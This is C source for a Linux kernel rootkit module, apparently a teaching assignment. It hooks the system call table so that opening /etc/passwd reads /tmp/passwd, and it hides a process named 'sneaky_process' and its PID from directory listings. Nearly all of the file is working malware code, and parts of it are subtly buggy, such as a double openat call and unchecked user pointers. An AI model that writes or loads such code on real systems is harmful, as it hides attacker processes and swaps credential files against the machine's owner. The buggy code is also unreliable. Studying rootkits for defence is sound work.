#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/moduleparam.h>
#include <linux/dirent.h>
#include <asm/string.h>

#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long *sys_call_table;

//Get PID of sneaky_process.c
static int pid = -1;
module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH);

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  char * orignal_name = "/etc/passwd\0";
  int n = original_openat(regs);
  char * filename = (char *)regs->si;

  if(strcmp(filename, orignal_name) == 0){
    copy_to_user(regs->si, "/tmp/passwd", sizeof("/tmp/passwd"));
    return original_openat(regs);
  }
  return n;
}

//original readdir function
asmlinkage int (*original_getdents64)(struct pt_regs * regs);

//sneaky version of fxn
asmlinkage int sneaky_getdents64(struct pt_regs * regs){
    int i = 0;
    struct linux_dirent64 __user *dirp = (struct linux_dirent64 *)regs->si;
    int n_bytes = original_getdents64(regs);
    struct linux_dirent64 * d = dirp;

    char pid_str[10];
    sprintf(pid_str, "%d", pid);
  
    while(i < n_bytes){
    
      if(strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid_str) == 0){
        //copy rest of dirp into curr 
        char * next = (char *)d + d->d_reclen;
        int len = (int)dirp + n_bytes - (int) next;
        memmove(d, next, len);
        n_bytes -= d->d_reclen; 
        continue;
      }
      //printk(KERN_INFO "I: %d\n", i);
      i += d->d_reclen;
      d = (struct linux_dirent64 *) ((char *)dirp + i);

    }

    //printk(KERN_INFO "bytes read: %d\n", n_bytes);
    return n_bytes;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  printk(KERN_INFO "PID of sneaky_process: %d\n", pid);

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // You need to replace other system calls you need to hack here
  
  //override readdir
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");